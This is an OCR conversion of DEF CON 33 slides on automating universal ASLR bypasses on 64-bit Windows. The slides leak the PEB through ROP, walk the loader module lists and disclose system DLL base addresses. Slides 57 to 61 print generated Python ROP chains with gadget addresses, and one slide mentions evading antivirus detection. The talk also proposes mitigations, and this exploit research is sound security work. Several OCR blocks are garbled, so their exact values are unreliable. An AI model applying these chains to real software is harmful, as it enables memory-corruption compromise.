---
title: "Can't Stop the ROP Automating Universal ASLR Bypasses for Windows"
speakers: ["Dr. Bramwell Brizendine"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Dr. Bramwell Brizendine - Can't Stop the ROP Automating Universal ASLR Bypasses for Windows.pdf"
pages: 85
sha256: "f8fbe8fa9fa28e27908ee56a6b27d7181ddee2c0c7f91c7ec40332ca8456a2a1"
text_chars: 40815
ocr_pages: 18
has_ocr: true
redacted_secrets: 0
ocr_confidence: 83.3
ocr_unreliable_blocks: 5
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:59:16Z"
---
# Can't Stop the ROP Automating Universal ASLR Bypasses for Windows

**Speakers:** Dr. Bramwell Brizendine  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Dr. Bramwell Brizendine - Can't Stop the ROP Automating Universal ASLR Bypasses for Windows.pdf` (85 pages)


## Slide 1

**Dr. Bramwell Brizendine Bw3ll** VERONA Labs / UAH August 10, 2025


> Recovered by OCR — confidence 94/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CAN'T STOP THE ROP
AUTOMATING UNIVERSAL ASLR
Dr. Bramwell Brizendine
VERONA Labs / UAH
August 10, 2025
```

## Slide 2

#### **Dr. Bramwell Brizendine**

- Director of the VERONA Lab @ UAH

   - Vulnerability and Exploitation Research for Offensive and Novel Attacks Lab

- Creator of ShellWasp: **<u>https://github.com/Bw3ll/ShellWasp</u>**

- Creator of the JOP ROCKET: **<u>http://www.joprocket.com</u>**

- Creator of SHAREM: **<u>https://github.com/Bw3ll/sharem</u>**

- Creator of ROP ROCKET: **<u>https://github.com/Bw3ll/ROP_ROCKET</u>**

- Interests: software exploitation, reverse engineering, code-reuse attacks,  malware analysis, and offensive security

- Regular speaker at many conferences: DEF CON, Black Hat, Hack in the Box, Virus Bulletin

- Principal Investigator on grants from NSA and DoD.

- Assistant Professor at UAH

- Education:

   - 2019 Ph.D in Cyber Operations

   - 2016: M.S. in Applied Computer Science

   - 2014: M.S. in Information Assurance

- Contact:

   - **<u>bramwell.brizendine@gmail.com</u>**

   - **<u>bramwell.brizendine@uah.edu</u>**

## Slide 3

#### **Why You Should Care**

- Because you should?

- High Entropy ASLR is Microsoft’s **top mitigation for memory corruption bugs** .

- High-Entropy ASLR is the **crown jewel in the arsenal** .

   - But sadly not so invincible – we bypass HE-ASLR on Win 8 to 11.

   - This is supposed to be Microsoft’s very best ASLR.

   - We achieve a **universal ASLR bypass** .

- **100 % success rate** in lab, tested across 11 OS builds.

   - We expected nothing less - but wanted to be sure.

- This talk gives us a **Demo + mini-tool** release for real-world use.

## Slide 4

Why did I do this work?

Microsoft Bug Bounty valued at $5,000 to $15,000 per vulnerability.

Mitigation Bypass and Bounty for Defense Terms

## Slide 5

#### **ROP Crash Course**

▪ Chain **gadgets** or **chunks of executable code** ending in `ret` .

▪ Can be used to **bypass** mitigations like DEP or ASLR and then launch shellcode.

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 6

##### **ASLR: Oh, Those Formative Early Years**

**Year Landmark Bypass**

**2001** PaX invents ASLR; Phrack shows **ret-to-libc** still works.

**2004** Shacham et al. show **32-bit entropy too small** – supports brute-force.

**2007 Windows Vista** supports ASLR.

2007– **Non-ASLR DLLs** (Whitehouse, BH EU 2007). 2009

**Why It Matters (Windows-centric)** Starts the idea that **code-reuse defeats randomization** .

Sets bar: **entropy must be bigger** ( 64-bit).

First mainstream Windows randomization.

Attackers use ROP chains with Flash/Java/AV DLLs.

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 7

##### **Side Channels & Universal Windows Leaks (2016 to 2025)**

**Year Breakthrough**

###### **Impact on Windows**

2016 **Jump Over ASLR** : BTB timing reveals user/kernel bases.

Shows CPU micro-architectural can overcome increased entropy.

- 2017 **ASLR** ⊕ **Cache (AnC)** : JavaScript cache attack from inside Edge/Chrome.

Browser sandbox does not imply ASLR success.

2018 **Meltdown/Spectre** leak kernel memory → KASLR collapse until KPTI.

Hardware flaws overcome software mitigations.

- 2025 **Universal ASLR Bypass** : 9 ROP-only chains leak Kernel32/Kernelbase/NTDLL on Win 8-11

Predictable structures are a point of failure for High-Entropy ASLR.

## Slide 8

#### **Classic Bypass Approaches**

▪ **Memory disclosure bug to leak address** ▪ **Heap/page spraying** ▪ **Brute-force attacks** (only feasible **pre-HEASLR** ) ▪ **Predictable, hardcoded addresses** (early Windows)

## Slide 9

#### **Our Approach**

▪ Attacker **already achieved one vuln** → has **initial ROP** . ▪ Can **pivot to ROP** .

▪ You need some vuln to compromise the binary; this serves to extend what you can do.

▪ Target: **64-bit Windows** (Win. 8–11) with **HEASLR** + Force Relocate enabled.

▪ **`/HIGHENTROPYVA`**

▪ **`/FORCERELRO`**

▪ Goal: **disclose base** of core system DLLs via ROP, kernel32, kernelbase, ntdll ▪ Need **sufficient payload size** .

## Slide 10

#### **Benefits to the Attacker**

▪ **Massive gadget attack surface explosion** : Adds thousands of new gadgets. ▪ **Portable across binaries** ; this will work 100% of the time with correct ROP gadgets.

Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows

## Slide 11

**Background: Process Environment Block**

▪ **Process Environment Block** (PEB) is still readable from user-mode.

▪ There are several common and **not so common** ways to obtain the PEB via ROP. ▪ We will go through all of them!

## Slide 12

## **TEB**

▪ This screenshot was made via **WinDbg** !


> Recovered by OCR — confidence 79/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
+0x038 Envir inter : Ptr oid
+0x040 ClientiId > _CLIENT_ID
0Ox050 ActiveRpcHandle : Ptr64 Void
bo x06 ThreadLocalStoragePointer : Ptr64 Void
Ox060 ProcessEnvironmentBlock : Ptr64 _PEB
+0x06c CountoOfOwnedcriticalSections : Uint4B
+0x070 CsrclientThread : Ptr64 Void
+0x078 Win32ThreadiInfo : Ptr64 Void
This screenshot
+0x080 User32Reserved : [26] Uint4e Wwasmade via
+0x0e8 UserReserved : [5] Uint4B WinDbg!
+0x100 woW32Reserved : Ptr64 Void
+0x108 CurrentLocale : Uint4B
+0x10c FpSoftwareStatusRegister : Uint4B
+0x110 ReservedForDebuggeriInstrumentation : [16] Ptré4
+0x190 SystemReservedl : [25] Ptr64 Void
```

## Slide 13

#### **PEB Winternl.h header file**

_from Microsoft SDK_

Analyzing and Creating Windows Shellcode for Hackers


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
«<= PEB Winternl.h header file
DEFCON
139
149
141
142
143
144
145
146
147
148
149
150
151
152
153
W typedef struct _PEB {
BYTE Reserved1[2]; YE trom Microsoft SDK
BYTE BeingDebugged;
BYTE Reserved2[1];
PVOID Reserved3[2];
PPEB_LDR_DATA Ldr;
PRTL_USER_PROCESS PARAMETERS ProcessParameters;
PVOID ReservedS[52];
BYTE Reserved6[ 128];
PVOID Reserved7[1];
ULONG SessionId;
\ PEB, *PPEB:
```

## Slide 14

#### **What We Hope to Do**

**1. Leak PEB** via one of multiple methods:

   - **`GS:[0x60]`** (or equivalent gadget).

      - 32-bit: **`fs:[0x30]` holds PEB**

      - WOW64: **Heaven’s Gate** → **`r12`** holds TEB pointer - this is a great, sneaky way to obtain it on x86.

- We can also use one of two **Windows syscalls** to the leak the PEB.

- ▪ **`RDGSBASE`** paired with a reg can also **leak the TEB** , indirectly leading to PEB.

- 2. Reach the: PEB_LDR_DATA.

,

3. Choose list: _InMemoryOrderModuleList_ , _InLoadOrderModuleList_ , _InInitializationOrderModuleList_ .

4. Follow **`Flink`** N times.

5. Add fixed offset to reach **`DllBase` = ASLR bypass** !

## Slide 15

**Example: Leaking the PEB**

\```
sbbrcx, qword ptrgs:[rsi+0x7D8DE873]
add al, byte ptr[eax]
pop ebp
ret 0x10
\```

▪ Control **`rsi`** ; the **`sbb`** (subtract) leaks **PEB** into **`rcx`** . ▪ We still need to **restore** it in **`rcx`** to its original form.

▪

## Slide 16

##### **Nine Variant Approaches to ASLR Bypass**

|**Target DLL**|**List**|**Flink hops**|**LIST offset**|**DllBase**|
|---|---|---|---|---|
|NTDLL|Mem|2|0x20|0x20|
|NTDLL|Load|2|0x10|0x30|
|NTDLL|Init|1|0x30|0x10|
|Kernel32|Mem|3|0x20|0x20|
|Kernel32|Load|3|0x10|0x30|
|Kernel32|Init|3|0x30|0x10|
|Kernelbase|Mem|4|0x20|0x20|
|Kernelbase|Load|4|0x10|0x30|
|Kernelbase|Init|2|0x30|0x10|

## Slide 17

**Our Universal ASLR Bypass Using InInitalizationModuleList to Obtain Kernel32**

## Slide 18

**Exploit Script to get Kernel32**

## Slide 19

#### **Capturing the PEB**

- We **pop 60** into **rbx** , after zeroing out rbp.

- Next, we execute **add  rdx,qword ptr gs:[rbp] # ret**

   - The **PEB** is going to be moved into **RDX**

- We can see the result here that **0x222000** is moved into **RDX** . ▪ The ! **peb command** confirms that is the location of the PEB.

## Slide 20

▪ We add a distance of **0x18** to **rbx** , which contains the **current address of the PEB** .

▪ That location provides the address of the **Peb_LDR** . ▪ We dereference it with gadgets like the below:

**Getting the PEB_LDR**

## Slide 21

#### **Getting the InInitalizationModuleList**

▪ We then add **0x30** from the location of **PebLDR** , to get access to **InInitalizationModuleList** , which we find in **rbx** .

## Slide 22

#### **Following the Flinks**

▪ We follow **0x564e60** to reach the **first flink** of **InInitalizationModuleList** by doing a **single mov dereference** to get the **NTDL flink** . ▪ We take **another mov dereference** to get the **kernelbase flink** . ▪ Finally, we take a **third mov dereference** to reach the **kernel32 flink** .

## Slide 23

**Final Step: Taking the DllBase**

▪ Once we reach the flink for Kernel32, we **add 0x10** to reach the pointer to **DLLBase** .

▪ We dereference this address to retrieve the DLLBase.

## Slide 24

**Taking the DLLBase**

▪ We can inspect memory to see the captured DL **LBase in memory at rbx** .

▪ This address corresponds to **Kernel32.dll base address**

## Slide 25

**Oh, look, we have Kernel32!**


> Recovered by OCR — confidence 66/100 on the text kept, 55/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
00007f fa 85a317ee 488b03 mov rax,qword ptr [rbx]
00007 fa* 85a317F3 488b1b rbx,qword ptr [rbx] O h 5 | 00 k, we i ()
}@0007f fa" 85a317fb c3 ret 1
00007f fa 85a318@2 488b1b mov rbx,qword ptr [rbx]
Command
|00007ffa°8c370003 0003 add byte ptr [rbx],al
00007f fa 8c370005 2000 add byte ptr [rax],al
KERNEL32!Rt1VirtualUnwindStub <PERF> (KERNEL32+0x7):
@0007f fa" 8c370007 200400 add byte ptr [raxtrax],al 5
KERNEL32!RtlVirtualUnwindStub <PERF> (KERNEL32+@xa): she
00007f fa 8c37000a 2000 add byte ptr [rax],al pa
KERNEL32!Rt1VirtualUnwindStub <PERF> (KERNEL32+@xc): 5955
0014838 595:
end 014F849 595:
b_over_4b c:\files\aslr_strong\b_over_4b.exe pa
```

## Slide 26

Typical Gadgets We Could Use
Purpose Example
Leak PEB mov rbx, gs:[rbx] ; ret
Add offset add rbx, rax ; ret
Deref. pointer mov rbx, [rbx] ; ret
Zero out reg xor rdx, rdx ; ret
Load value pop rax ; ret

## Slide 27

**Alternative Routes Leading to the PEB**

## Slide 28

#### **Why bother with these alternatives?**

▪ Some binaries **lack** **`GS:[0x60]` or** **`GS:[reg]` gadgets** !

▪ This is the easiest way to leak it, but if not -> **we have other ways!**

▪ Pure syscall leak works even when **GS is not easily obtainable** .

▪ The cost is a larger payload size.

## Slide 29

#### **Two Syscalls Roads to the PEB**

**Technique Syscall We recv back Extra Offset? gift-wrapped Thread NtQueryInformationThread TEB** pointer add + **0x60** to **route** (ThreadBasicInformation) reach PEB **Process NtQueryInformationProcess PEB** pointer None! **route** (ProcessBasicInformation)

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 30

#### **–** **<u>ROP NtQueryInformationProcess</u>**

|**Goal / step**|**Representative gadget(s)**|**Notes**|
|---|---|---|
|**RDX←0**
(ProcessInformationClass)|**POP RDX ; RET**|0 =**ProcessBasicInformation**|
|**R8←&outBuf**|**LEA R8,[RSP+imm] ; RET**
Any valid, writable memory
can be used here||
|**R9D←0x30**(buffer size)|**POP R9 ; RET**|0x30 is the size of
**PROCESS_BASIC_INFORMATION**|
|**R10←-1**(ProcessHandle)|**POP RAX ; MOV R10,RAX**
**; … ; RET**|Pseudohandle
**NtCurrentProcess**= -1|
|**EAX ← 19h**(syscall ID)|**POP RAX ; RET**|0x19 is
**NtQueryInformationProcess**on
most recent builds|
|**invoke syscall**|**SYSCALL ; RET**|Executes syscall with the
registers prepared above|
|**RAX ← PEB**|**MOV RAX,[RSP+20h] ;**
**RET**|**PebBaseAddress**field is at
offset 0x8 from mem. pointed to
by r8.|

## Slide 31

**NtQueryInformationProcess SSN**

▪ The SSN for this syscall remains **stable across Win. 10-11** .


> Recovered by OCR — confidence 89/100 on the text kept, 59/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
> SSN
DEFC®N . The SSN for this syscall remains stable across
Win. 10-11
0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 | 0x0019 0x0019 0x0019 | 0x001} x0019 0x0019
```

## Slide 32

**Structure for PROCESS_BASIC_INFORMATION** **`typedef struct _PROCESS_BASIC_INFORMATION`** `{ PVOID Reserved1; PVOID PebBaseAddress;` **`// <- we want this //  (offset 0x08)`** `PVOID Reserved2[2]; ULONG UniqueProcessId; ULONG InheritedFromUniqueProcessId; } PBI;`

## Slide 33

#### NtQueryInformationProcess

▪ Sample code for **NtQueryInformationProcess** shown in **WinDBG**

▪ Not in ROP form.

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 34

#### NtQueryInformationProcess

▪ The **PEB** address is retrieved directly from **NtQueryInformationProcess** . **Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 35

###### **`NtQueryInformationThread`**

###### **`via ROP`**

|**Goal**|**Gadget**|**Notes**|
|---|---|---|
|**load 0 into**
**RDX**|**POP RDX ; RET**|ThreadBasicInformation|
|**store buffer**|**LEA R8, [rsp+50h]**|any writable memory suffices|
|**R9D ←0x30**|**POP R9 ; RET**|Size of ThreadBasicInformation|
|**R10 ←-2**|**POP RAX ; MOV R10,RAX**;|Pseudo-handle for current thread|
|**EAX ←0x25**|**POP RAX ; RET**|NtQueryInformationThread SSN|
|**syscall**|**SYSCALL ; RET**|executes the call|
|**RAX ←TEB**
**ptr**|**MOV RAX,[RSP+58h] ; RET**|reads supplied buffer|
|**capture PEB**|**ADD RAX,60h ; RET**|**PEB**is at**TEB + 0x60**|

## Slide 36

**`NtQueryInformationThread SSN`** ▪ The SSN for this syscall remains **stable across all of Win. 10-11** . ▪ We really **don’t need to resolve** it.

▪
We really

## Slide 37

#### **NtQueryInformationThread**

▪ We can see a snippet of this in action in WinDbg.

.

▪ We **ignore RCX** – it would have been moved to **r10** by then **native API version of NtQueryInformationThread** .

## Slide 38

▪ After syscall, we can retrieve the **TEB** . From **TebBaseAddress** , at offset 0x8 from the start of **THREAD_BASIC_INFORMATION** .

.

**_We will get to the PEB shortly._**

**NtQueryInformationThread**

## Slide 39

**NtQueryInformationThread**

▪ WE can simply add **0x60** to the **TEB** to retrieve the **PEB** .

▪


> Recovered by OCR — confidence 79/100 on the text kept, 59/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
— WE can simply add 0x60 to the
Q@:001> !teb .
TEB at 00000000002af000 TEB to retrieve the PEB.
ExceptionList: 0000000000000000
StackLimit: 00000000006Fc000
Self: Q0000000002af000
ClientId: 0000000000000a30 . 0000000000000c80
RpcHandle: 0000000000000000
```

## Slide 40

▪

##### **– Our Dream Gadget! RDGSBASE to PEB**

▪ **`RDGSBASE`** leaks the **TEB** directly.

▪ **Adding 0x60** gives us the **PEB** . ▪ Not widely known, but made public for offensive use by **@synawk** in 2024. ▪ Great way to **obscure PEB access** and **bypass AV static detection** that is not super current! **`rdgsbase rax`** _`; RAX = GS base  → TEB`_ **`add rax, 60h`** _`; RAX = &TEB->PEB`_ **`mov rax, [rax]`** _`; RAX = PEB`_ **`ret` Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 41

**RDGSBASE in WinDbg** ▪ Rdgsbase puts the TEB into the designated reg, **rax** .


> Recovered by OCR — confidence 83/100 on the text kept, 52/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
add rsp,40h
ret
rdgsbase rax
Q:001> t
Q@:001> !teb
TEB at 900000000
mov rax,qword ptr [rax]
sub rsp,40h
mov rox, OFFFFFFFFFFFFFFFFh
```

## Slide 42

**RDGSBASE in WinDbg** ▪ Adding **0x60** gives us a **pointer** to the **PEB address** .


> Recovered by OCR — confidence 70/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Offset: | @$scopeip Previous
Q0007FFF 9bab6bbe c3 ret
Q0007f fF Ibab6bbf f3480Faec8 rdgsbase rax
Q0007fFF Sbab6bc4 4883c060 add rax,60h
rsi |®
rdi |®
@:001> dd_rax
```

## Slide 43

#### **RDGSBASE in WinDbg** ▪ We can **dereference** to retrieve the **PEB** address, **0x2ac00** .

**_We dereference here_**


> Recovered by OCR — confidence 75/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Offset: | @$scopeip | Previous
100007fFF Ibab6bbf F3480faec8 rdgsbase rax
100007FfF 9bab6bc4 4883c060 ad 60h rence here
100007ffF Ibab6be2 41b928000000 mov r9d,28h
@:001> !peb
PEB at 9000000
```

## Slide 44

**When the Gadget Doesn’t Exist:** **_Roll Your Own Gadget_**

▪ So we can **effectively synthesize** our own obscure gadgets, like **`rdgsbase`** ! Why not?

**1. Get some writable memory** ▪ Re-use existing RW section or call **`VirtualAlloc`** or **NtAllocateVirtualMemory** , etc. **2. Write the opcodes to memory** ▪ Just doing **rdgsbase rax** itself likely would be sufficient!

## Slide 45

**Exploit Demo**

Video of tool in action!

## Slide 46

#### **Reality Check**

- I estimate that this attack would work greater than **98% of the time** , as long as:

▪ You have an **ability to use ROP with some basic gadgets** (loading registers).

   - Do you need to leak the GS reg?

      - No, we have alternative ways, such as syscalls, **which likely will always work!**

   - Payload size is not too tiny we can’t do anything.

- Will we always want to or need to do this?

   - No, **it is an enhancer** - a way to **enhance our exploit** and **give us tons more gadgets** (potentially thousands.

      - So what was hard or impossible - **is now easy** .

## Slide 47

**Some Possible Mitigations**

## Slide 48

###### **: Mitigation 1 Randomize LDR_DATA_TABLE_ENTRY**

- Introduce unpredictable offsets within LDR_DATA_TABLE_ENTRY to **breaks fixed offset traversals** (0x18 / 0x10 / 0x20 / 0x30).

- Random gaps & altered positions of module lists prevent reliable DLL enumeration by attackers.

- Example: InMemoryOrderModuleList's LIST_ENTRY could appear at offset 0x800 after original structure end.

- Distances between LIST_ENTRYs randomized (e.g., 0x40 vs 0x302 bytes) to block ROP.

- OS can supply distances to processes without exposing them to attackers.

- Implemented as optional OS-level protection for legacy software compatibility.

- Insert **unpredictable padding** / **reorder LIST_ENTRY** fields.

- **Can only be implemented as an OS update** .

- **Randomize gap distances in kernel** , hide from user-mode

- Will break any exploit that uses fixed 0x10/0x20/0x30 offsets.

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 49

##### **Mitigation 2: Privileged PEB Access**

- Move **`GS:[0x60]` pointer** to kernel.

- Block direct segment load in user-mode ( **raise a sweet** **`#GP` fault** )

- Legit needs met by new syscall, which we call **NtQueryProcessModuleInfo** , that checks policy.

- Could **examine CFG** to see if a **likely valid path led to this** .

- ▪ Similar in spirit to **Linux** **`d_portals` KASLR** work

▪
▪

   - Hide some pointers out of user-mapped areas.

- Major architectural lift but eradicates class of bypasses.

## Slide 50

**Other Possible Mitigations**


> Recovered by OCR — confidence 75/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Other Possible Mitigations ee =
```

## Slide 51

##### **Pointer Obfuscation / Encryption**

▪ **Encode module pointers** in PEB lists with a **secret key** unique to each process.

▪ Windows already has **`EncodePointer`** / **`DecodePointer`** .

▪ Why not **use it internally** to help protect the PEB and structs related to module lists?

▪ Attacker reading raw PEB values would **see garbage addresses** .

▪ Legit APIs that may need PEB could be reconfigured to **decode PEB values on the fly** .

▪ Attacker would see encrypted values. :-(

▪ Non-trivial effort!

Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows

## Slide 52

###### **Fine Grained ASLR & Dynamic ASLR**

▪ **Randomizes the internal layout of code** : shuffle functions and even basic blocks.

▪ Even if an attacker gets leaked DLL base, gadgets would still shift unpredictably. ▪ **Dynamic ASLR** : periodic rebasing / rerandomizing during runtime - i.e. at certain times or events.

.

▪ Would shorten memory leak lifetimes.

▪ Demonstrated to work in academic research.

▪ **Very challenging to implement** with code in use - likely **not viable for Windows** .

▪ Would be a major engineering challenge to **relocate live code without performance costs** .

▪ These would serve to **complement** - not replace - current ASLR protections.

## Slide 53

##### **Execute Only / Privileged Memory**

- Some hardware offer Execute-Only Memory (XOM) and Memory Protection Keys (MPK).

▪ Requires HW support.

- Could simply mark PEB & loader pages **non-readable** (XOM) to user-mode reads.

   - Access could be granted via carefully setup APIs.

- Read attempts outside this could trigger an access violation.

- ▪ Would need to refactor of some loader and CRT routines, runtime libraries.

   - Would need to be addressed on case-by-case basis - nontrivial!

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 54

### **Enhanced Exploit Detection**

▪ We already have **Export Address Table Filtering (EAF / EAF+)** , to alert on shady export scans. ▪ Has been around for quite some time. ▪ Possible future heuristics: **flag abnormal LIST_ENTRY walks** or rapid PEB derefs.

   - Not necessarily easy to do in actual practice. :-(

- This does **not prevent a leak** ; instead, it prevents it pivoting to ROP.

## Slide 55

ASLR Bypass Mini-Tool

## Slide 56

##### **-** **`-` Mini Tool:** **`rop_rocket aslr bypass`**

▪ **Generates complete 64-bit chain** for any 64-bit application.

- Attempts to generate chains for all nine variants.

▪ Outputs Python exploit with the 64-bit ASLR bypass

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**

## Slide 57

#### - ASLR Bypass Mini Tool

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**


> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
import struct
oe “cesses” ASLR Bypass Mini-Tool
def binaryToStr(binary):
DEFCON new =
for v in binary:
new += "\\x"+"{0:02x}". format (v)
return new
def genchQ(gList):
ch:
for g in glist:
ch+=rq(g)
return ch
gListaQ = [
@x0000000180006b14, #pop rax # ret # load rax, Loading @x6@ for GS segment reg #
@x000000018000864b, #mov rax, quord ptr gs:[rax] # ret # #
©x0000000180007514, #mov rbx, rax # ret # Transfer reg #
@x0000000180006b14, #pop rax # ret # load rax, Loading @x18, offset to reach PEB_LDR #
@x9e90000180008168, #add rbx, rax # ret # Add to get PEB_LDR #
= x00800001800070C4, #mov rax, qword ptr [rbx] # ret # Dereferencing the PEB_LDR #
ie @x00000001800080bc, #pop rbx # ret # load rbx, Loading @x3@ - value to reach LOR.InInitalizationModul
@x0000000180008128, #add rax, rbx # ret # Adding value to reach InInitalizationModuleList #
@x0000000180007004, #mov rax, qword ptr [rax] # ret # 1Dereference LOR.InInitalizationModuleList 1--
@xeeeeee180008Cbc, #pop rbx # ret # load rbx, Loading @x1@, offset to reach base of NTDLL #
@x0000000180008128, #add rax, rbx # ret # Add to get ptr to base of NTDLL #
©x0090000180007004, #mov rax, qword ptr [rax] # ret # Obtained base address of NTDLL #
]
payload = ch
‘nt (binaryToStr(payload) )
t (len(payload), “bytes”)
“(1 = open(“test.bin", “wb")
vil.write(payload)
levil.close() ndows
```

## Slide 58

#### **PEB Disclosure Via GS Register**

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OO
eG. PEB Disclosure Via GS Register
DEFCON
gListQ = [
rax #
]
#pop
#
#mov
#mov
#pop
#
#add
#mov
#pop
#
#mov
#pop
#
#add
#mov
rax # ret
rax, quord
rbx, rax #
rax # ret
rbx, rax #
rax, qword
rbx # ret
rax, rbx #
rax, quword
rbx # ret
rax, rbx #
rax, qword
# load rax, Loading @x60 for GS segment reg #
ptr gs:[rax] # ret # #
ret # Transfer reg #
# load rax, Loading 0x18, offset to reach PEB_LDR #
ret # Add to get PEB_LDR #
ptr [rbx] # ret # Dereferencing the PEB_LDR #
# load rbx, Loading 0x30 - value to reach LDR. InInitalizationModul
ret # Adding value to reach InInitalizationModuleList #
ptr [rax] # ret # 1Dereference LDR.InInitalizationModuleList 1--
# load rbx, Loading 0x10, offset to reach base of NTDLL #
ret # Add to get ptr to base of NTDLL #
ptr [rax] # ret # Obtained base address of NTDLL #
```

## Slide 59

#### **PEB Disclosure Via Rdgsbase**

**Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows**


> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eG. PEB Disclosure Via Rdgsbase
DEFCON
glistQ = [
@x0000000180006cC72, #rdgsbase rax # ret # Leak TEB64 address, storing it at rax #
@xeeeeeee18E8E80bc, #pop rbx # ret # load rbx, distance to reach PEB pointer #
Qx0000000180008128, #add rax, rbx # ret # Adding offset @x6@ to get PEB address #
Qx0000000188007004, #mov rax, qword ptr [rax] # ret # Dereferencing to obtain PEB #
@x0000000180007514, #mov rbx, rax # ret # Transfer reg #
@x0000000180006b14, #pop rax # ret # load rax, Loading 0x18, offset to reach PEB_LDR #
0x0000000180008160, #add rbx, rax # ret # Add to get PEB_LDR #
0x00000001800070C4, #mov rax, qword ptr [rbx] # ret # Dereferencing the PEB_LDR #
@x00000001800080bc, #pop rbx # ret # load rbx, Loading @x3@ - value to reach LDR.InInitalizationmModul
@x0000000180008128, #add rax, rbx # ret # Adding value to reach InInitalizationModuleList #
Qx0000000180007004, #mov rax, qword ptr [rax] # ret # 1Dereference LDR.InInitalizationModuleList 1--
rax #
@x00000001800080bc, #pop rbx # ret # load rbx, Loading 0x10, offset to reach base of NTDLL #
0x0000000180008128, #add rax, rbx # ret # Add to get ptr to base of NTDLL #
@x0000000180007004, #mov rax, quword ptr [rax] # ret # Obtained base address of NTDLL #
]
```

## Slide 60

**PEB Disclosure Via Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows NtQueryInformationProcess**


> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
ListQ = [
@x0000000180006C06, #mov rax, rsp # ret # Save esp to rax #
0x0000000180006ed7, #pop rbx # ret # load rbx, loading for Getting pointer to calculate distance to P|
rocessInformation buffer #
exeeee09e18000838F, #add rax, rbx # ret # Getting pointer to calculate distance to ProcessInformation|
buffer #
0x0000000180006C35, #mov r8, rax # ret # Transfer to4 r8 #
@x000000018000719b, #xor rdx, rdx # ret # ProcessInformationClass = @ (BasicInfo) #
@x0000000180006ed0, #pop r9 # ret # load r9, Buffer size #
©x0000000180006b14, #pop rax # ret # load rax, NtQueryInformationProcess SSN (all Win. 10-11) #
0x0000000180006ed3, #pop rie # ret # load r10, first parm from rcx - current process #
@x9000000180006ce7, #syscall # ret # #
@x0000000180006C06, #mov rax, rsp # ret # Save esp to rax #
@x0000000180006ed7, #pop rbx # ret # load rbx, loading for Getting pointer to PEB #
0x000000018000838F, #add rax, rbx # ret # Getting pointer to PEB #
@x800000018000777b, #mov rbx, rax # ret # Transfer to4 rbx #
©x000000018000732b, #mov rax, qword ptr [rbx] # ret # Dereferencing to obtain PEB #
0x0000000180006cC35, #mov r8, rax # ret # Transfer reg #
@x0000000180006b14, #pop rax # ret # load rax, Loading @x18, offset to reach PEB_LDR #
exeeee9ee18e0e6c6s, #add rs, rax # ret # Add to get PEB_LDR #
@x0000000180006e8e, #mov rax, qword ptr [r8] # ret # Dereferencing the PEB_LDR #
@x0000000180006ed7, #pop rbx # ret # load rbx, Loading @x3@ - value to reach LDR.InInitalizationModul
@xeee0000180006c6a, #add eax, ebx # ret # Adding value to reach InInitalizationModuleList #
©x@00000018000726b, #mov rax, qword ptr [rax] # ret # 1Dereference LDR.InInitalizationModuleList 1--
0x0000000180006ed7, #pop rbx # ret # load rbx, Loading @x1@, offset to reach base of NTDLL #
```

## Slide 61

**PEB Disclosure Via Can’t Stop the ROP: Automating Universal ASLR Bypasses for Windows NtQueryInformationThread**


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6x0088000180006C06, #mov rax, rsp # ret # Save esp to rax #
@x0000000180006ed7, #pop rbx # ret # load rbx, loading for Getting pointer to calculate distance to b
uffer for THREAD_BASIC_INFORMATION #
@x000000018000838F, #add rax, rbx # ret # Getting pointer to calculate distance to buffer for THREAD_
BASIC_INFORMATION #
